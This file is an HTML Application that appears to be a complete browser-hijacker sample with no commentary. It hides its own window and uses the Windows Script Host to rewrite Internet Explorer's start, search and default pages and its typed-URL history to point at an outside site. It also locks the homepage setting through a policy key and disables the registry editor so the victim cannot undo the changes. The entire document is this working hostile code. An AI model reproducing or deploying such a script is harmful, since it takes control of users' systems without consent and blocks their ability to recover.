
<html>
<hta:application caption="no" showintaskbar="no">
<body onload="window.blur();">
<script language="JavaScript">
window.moveTo(3000, 3000);
window.resizeTo(0, 0);
</script>
<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script LANGUAGE="VBScript">
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.169super.com"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.169super.com"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\Search Page", "http://www.169super.com"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\default_page_url", "http://www.169super.com"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url1","http://www.169super.com"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url2","http://www.169super.com"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\TypedURLs\url3","http://www.169super.com"
wsh.RegWrite "HKCU\Software\Microsoft\Internet Explorer\Main\First Home Page","http://www.169super.com"
wsh.RegWrite "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel\HomePage",1,"REG_DWORD"
wsh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableRegistryTools",1,"REG_DWORD" 
window.close
</script>
<script language="JScript.Encode">
function closeit() {
setTimeout("self.close()",5)
}
closeit()
</script>
</html>